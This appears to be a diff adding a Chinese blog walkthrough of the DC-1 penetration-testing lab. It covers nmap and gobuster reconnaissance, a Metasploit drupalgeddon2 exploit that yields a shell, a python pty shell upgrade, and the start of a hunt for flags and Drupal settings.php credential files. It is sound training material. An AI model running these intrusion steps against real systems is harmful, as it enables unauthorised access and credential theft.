@@ -16,15 +16,76 @@
   <meta name="author" content="Sweety">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="DC-1首先，需要让kali与靶机出于同一个网段，需要将二者都设置成桥接模式（NAT模式），这样kali在进行地址扫描的时候才能够扫除靶机的IP。 靶机IP地址确认（1）可以直接通过vmvare查看DC-1靶机的MAC地址（00:0C:29:E5:19:3C）  在kali中进行地址段扫描：（nmap扫描法） 1sudo nmap -sN 192.168.204.0&#x2F;24  扫描得到的结果如下：">
+<meta property="og:type" content="article">
 <meta property="og:title" content="DC-1">
 <meta property="og:url" content="https://haoisbinlove.github.io/2024/07/24/DC-1/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="DC-1首先，需要让kali与靶机出于同一个网段，需要将二者都设置成桥接模式（NAT模式），这样kali在进行地址扫描的时候才能够扫除靶机的IP。 靶机IP地址确认（1）可以直接通过vmvare查看DC-1靶机的MAC地址（00:0C:29:E5:19:3C）  在kali中进行地址段扫描：（nmap扫描法） 1sudo nmap -sN 192.168.204.0&#x2F;24  扫描得到的结果如下：">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721909942087.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910134252.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910168155.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910333640.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910370512.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910301109.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910497135.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910518883.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910561368.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910577299.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910624007.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910639657.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910712860.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910769368.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910815582.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911011291.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911032733.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911162748.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911217520.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911246290.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911328575.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911347750.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911382479.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911445441.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911471937.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911485786.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911507274.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911524939.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911585897.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911600169.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911651067.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911693543.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911742361.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911885892.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911929825.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912100696.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912152617.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912172891.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912205136.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912238522.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912450355.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912499494.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912714433.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912949408.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913292131.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913312573.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913355053.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913389424.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913374497.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913409356.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240619125252692.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913636136.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913619371.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913790835.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913908123.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913930750.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913967593.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913992790.png">
 <meta property="article:published_time" content="2024-07-24T01:31:05.000Z">
-<meta property="article:modified_time" content="2024-07-24T01:31:05.237Z">
+<meta property="article:modified_time" content="2024-07-25T13:28:25.608Z">
 <meta property="article:author" content="Sweety">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721909942087.png">
   
   
   
@@ -217,7 +278,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          4.7k 字
         
       </span>
     
@@ -228,7 +289,7 @@
         
         
         
-          1 分钟
+          40 分钟
         
       </span>
     
@@ -270,7 +331,400 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a><strong>DC-1</strong></h1><p>首先，需要让kali与靶机出于同一个网段，需要将二者都设置成桥接模式（NAT模式），这样kali在进行地址扫描的时候才能够扫除靶机的IP。</p>
+<h2 id="靶机IP地址确认"><a href="#靶机IP地址确认" class="headerlink" title="靶机IP地址确认"></a>靶机IP地址确认</h2><p><strong>（1）可以直接通过vmvare查看DC-1靶机的MAC地址（00:0C:29:E5:19:3C）</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721909942087.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在kali中进行地址段扫描：（nmap扫描法）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure>
+
+<p>扫描得到的结果如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910134252.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对比mac地址，得到了靶机的IP地址。其他的地址扫描方法以及得到的效果如下：<br>p1：（arp-scan扫描）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo arp-scan -l<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910168155.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>p2：（netdiscover扫描 – 速度很慢）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910333640.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>（2） 也可以通过开关靶机扫描来确定靶机的IP地址</strong> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure>
+
+<p> 关闭靶机时，扫描得到的结果：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910370512.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>打开（或挂起）靶机时，扫描得到的结果：</p>
+<p>会发现多了一个IP地址。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910301109.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>（1）扫描目标靶机IP的开放端口</strong></p>
+<p><code>-sV</code> ：对端口上的服务程序进行扫描，扫描提供服务的版本。</p>
+<p><code>-p </code>： 指定扫描端口，<code>-p- </code>指的是从1到65535端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p- 192.168.204.129<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910497135.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><code>-sT</code>：TCP连接扫描，不安全，速度较慢，但相对准确。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -p- 192.168.204.129<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910518883.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>根据结果可以看到，开放的端口有<code>22、80、111、51393</code></p>
+<p><strong>（2）扫描开放端口的具体信息</strong></p>
+<p><code>-sT</code> ：TCP连接扫描，不安全，速度较慢，但相对准确</p>
+<p><code>-sV</code> ： 对端口上的服务程序进行扫描，扫描提供服务的版本</p>
+<p><code>-sC</code> ：表示使用默认的脚本进行扫描</p>
+<p><code>-O</code> ：扫描操作系统的版本</p>
+<p><code>-p </code>： 指定扫描端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910561368.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910577299.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过80端口呈现出来的信息可以知道，它是一个Drupal网站。</p>
+<p>什么是Drupal呢？通过网上查询，可以知道：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Drupal是一个开源的CMS框架，是一个基于LAMP技术栈的CMS框架，它允许通过安装和卸载模块的方式添加和移除功能。CMS（内容管理系统）是一种软件，允许用户使用各种智能产品中的web浏览器访问网站，添加、发布、编辑和删除内容。</th>
+</tr>
+</thead>
+</table>
+<p>通过<code>searchsploit</code>命令搜索，可以查找到CMS框架的漏洞。</p>
+<table>
+<thead>
+<tr>
+<th align="left">searchsploit是一个用于Exploit-DB的命令行搜索工具。许多漏洞都包含了二进制文件的链接，这些文件不包含在存储库中，但可以在Exploit-DB二进制文件中找到。</th>
+</tr>
+</thead>
+</table>
+<p>输入命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit drupal cms<br>searchsploit drupal<br></code></pre></td></tr></table></figure>
+
+<p>得到如下扫描结果：</p>
+<p>可以看到这类cms框架的漏洞不少。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910624007.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910639657.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>使用浏览器访问靶机IP，显示为一个Drupal网页：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910712860.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>再次查看扫描得到的端口信息，可以得知80端口服务器下的文件目录，其中有一个<code>install.php</code>的文件，选择它的原因呢，命名是install，下载文件，如果可以自己重新下载一个，并修改其中的参数，也许下载得到的效果就不一样了（&#x2F;doge）。</p>
+<p>使用浏览器访问该文件，在上述网站网址后面加上<code>/install.php</code>。如下，可以看到一些信息，比如第二个提示”若想下载一个不同的数据库，需要在sites文件夹中适当编辑setting.php文件”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910769368.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="扫描常见UDP端口"><a href="#扫描常见UDP端口" class="headerlink" title="扫描常见UDP端口"></a>扫描常见UDP端口</h2><p><code>--top-ports  n</code>   ： 扫描最常用的n个端口。</p>
+<p>对靶机IP地址进行扫描，扫描其中最常见的20个UDP端口，查看其开放状态，保存信息备用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.204.129<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910815582.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><p>对靶机进行nmap漏扫：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>nmap -script&#x3D;vuln -p 是使用Nmap运行漏洞脚本扫描的命令。</p>
+<p>其中“-script&#x3D;vuln”告知nmap要运行漏洞脚本扫描</p>
+</blockquote>
+<p>扫描结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911011291.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911032733.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>首先会显示目标主机的IP地址（nmap scan report for targetIP）</p>
+<p>然后会显示扫描过程中检测到的开放的端口号（port    state    service）</p>
+<p>下一个项目就是显示漏洞的检测结果，对于每个开放的端口，显示是否发现了与该端口相关的已知漏洞。如上图扫描结果，关于80端口的漏洞不少。</p>
+<h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><table>
+<thead>
+<tr>
+<th align="left">gobuster是一个用于在网站目录或者文件中进行快速且有效的字典攻击工具。它可以帮助发现目标网站中隐藏的路径。执行的功能有：目录扫描、子域名扫描、文件扩展名扫描、多线程支持、结果报告。多用于渗透测试和安全审计中。</th>
+</tr>
+</thead>
+</table>
+<p>执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.129 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure>
+
+<p><code>-u</code>：指明待输入的待扫描的网站</p>
+<p><code>-w</code>：指明字典文件的路径</p>
+<p><code>dir</code>：表示使用目录&#x2F;文件枚举模式</p>
+<p>鉴定为：爆破过程太久了啊<del>，不如直接利用漏洞</del></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911162748.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>gobuster常使用的命令和标志：</strong></p>
+<ul>
+<li><p>命令（模式）</p>
+<p><strong>completion</strong>：为指定的shell生成自动完成脚本<br><strong>dir</strong>：使用目录&#x2F;文件枚举模式<br><strong>dns</strong>：使用DNS子域枚举模式<br><strong>fuzz</strong>：使用模糊测试模式。替换URL、Headers和请求体中的关键词FUZZ<br><strong>gcs</strong>：使用gcs bucket枚举模式<br><strong>help</strong>：获取任何命令的帮助信息<br><strong>s3</strong>：使用aws bucket枚举模式<br><strong>tftp</strong>：使用TFTP枚举模式<br><strong>version</strong>：显示当前版本<br><strong>vhost</strong>：使用VHOST枚举模式（您很可能想在URL参数中使用IP地址）</p>
+</li>
+<li><p>标志（全局参数）</p>
+<p><strong>–debug</strong>：启用调试输出<br><strong>–delay duration</strong>：每个线程在请求之间的等待时间（例如1500ms）<br><strong>-h, –help</strong>：获取gobuster的帮助信息<br><strong>–no-color</strong>：禁用彩色输出<br><strong>–no-error</strong>：不显示错误<br><strong>-z, –no-progress</strong>：不显示进度<br><strong>-o, –output string</strong>：写入结果的输出文件（默认为stdout）<br><strong>-p, –pattern string</strong>：包含替换模式的文件<br><strong>-q, –quiet</strong>：不打印横幅和其他无关信息<br><strong>-t, –threads int</strong>：并发线程的数量（默认为10）<br><strong>-v, –verbose</strong>：详细输出（错误）<br><strong>-w, –wordlist string</strong>：指向字典文件的路径。设置为-以使用STDIN。<br><strong>–wordlist-offset int</strong>：从字典文件中的指定位置恢复（默认为0）<br>（原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_70137901/article/details/134613324%EF%BC%89">https://blog.csdn.net/weixin_70137901/article/details/134613324）</a></p>
+</li>
+<li><p>gobuster使用基本语法</p>
+<p><strong>目录扫描：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -w 选择一个字典 -u 输入要扫描的网站 -x 扫描的文件类型 -t 线程数量<br></code></pre></td></tr></table></figure>
+
+<p><strong>子域名扫描：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dns -d 域名 -w 字典<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Drupal-CMS漏洞查找"><a href="#Drupal-CMS漏洞查找" class="headerlink" title="Drupal CMS漏洞查找"></a>Drupal CMS漏洞查找</h2><p>使用Metasploit查询该CMS漏洞并进行测试。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Metasploit是一款开源渗透测试框架，可以进行信息收集、漏洞扫描、漏洞利用和后渗透攻击。提供了Payload生成器用于生成各种类型的恶意代码，如shellcode、Trojan程序等。还可以通过编写脚本自动化渗透测试过程。</th>
+</tr>
+</thead>
+</table>
+<p>首先打开工具：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入命令：msfconsole<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911217520.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>输入命令查找Drupal CMS漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search Drupal<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911246290.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>根据查询结果，可以得知这个Drupal CMS框架还是有蛮多漏洞的。Rank表示漏洞等级。此处利用漏洞等级较高且时间最新的2018年的漏洞。</p>
+<blockquote>
+<p> exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 </p>
+</blockquote>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/drupal_drupalgeddon2<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911328575.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查看该漏洞模块的参数：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911347750.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>其中，<code>Current Setting </code>是目前设置的内容，<code>Required</code>表示是否需要设置内容，yes为必须，no为可选。</p>
+<p>然后可以看到有一个<code>RHOSTS</code>项目，重置HOST，设置为必须设置。因而接下来需要设置RHOSTS的内容，即攻击目标IP地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.129<br></code></pre></td></tr></table></figure>
+
+<p>然后再查看一下模块的参数，确认设置完成：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911382479.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然后执行run&#x2F;exploit命令开始攻击：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run/exploit<br></code></pre></td></tr></table></figure>
+
+<p>出现如下提示信息表明攻击成功！</p>
+<p><code>Meterpreter session 1 opened </code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911445441.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>利用漏洞攻击目标主机成功之后就可以Getshell获取权限了。</p>
+<h3 id="1、获取普通shell"><a href="#1、获取普通shell" class="headerlink" title="1、获取普通shell"></a>1、获取普通shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911471937.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然后在上述光标处输入并执行ls命令，获取目标目录下的文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911485786.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过执行命令可以判断所得到的权限级别：</p>
+<blockquote>
+<p>一般来说，对于用户类型的ID分配为：</p>
+<p>①系统管理员id&#x3D;0；②普通用户id&#x3D;1~65535。</p>
+<p>而且当所获取的权限为系统管理员权限时，执行 <code>whoami</code>显示的用户名是root。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span><br><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911507274.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>显然，这里获取的权限是普通用户的权限。尽管只是普通权限， 但我们仍可以通过这些普通权限去获取别的信息。</p>
+<p>- </p>
+<p><strong>使用命令测试是否提权成功，就是切换用户到靶机用户，得到如下效果：</strong></p>
+<p><strong>Pay：这个操作是必要的，不然会导致提权被迫失败。</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 利用python的‘pty’模块来生成一个交互式的bash shell<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911524939.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>- </p>
+<p>比如，使用cat命令看看flag1.txt文件（上述执行ls获得的目录列表文件之一）的文件内容是什么：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911585897.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>继而搜索其他flag文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name flag*<br></code></pre></td></tr></table></figure>
+
+<p>结果显示只有flag1.txt了捏：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911600169.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>下一步要干什么呢？通过网路查询Drupal CMS的配置文件一般叫什么，以它为切入口。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911651067.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>经过查询得知，Drupal的配置文件一般叫settings.php，因而找出所有<code>*settings.php</code>文件出来。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *settings.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911693543.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>一共找到了三个捏。根据文件名，第一个文件大概率是主题相关的，可以先查看后面两个文件。</p>
+<blockquote>
+<p>&#x2F;var&#x2F;www&#x2F;themes&#x2F;garland&#x2F;theme-settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;default.settings.php</p>
+</blockquote>
+<p>先查看第二个文件：</p>
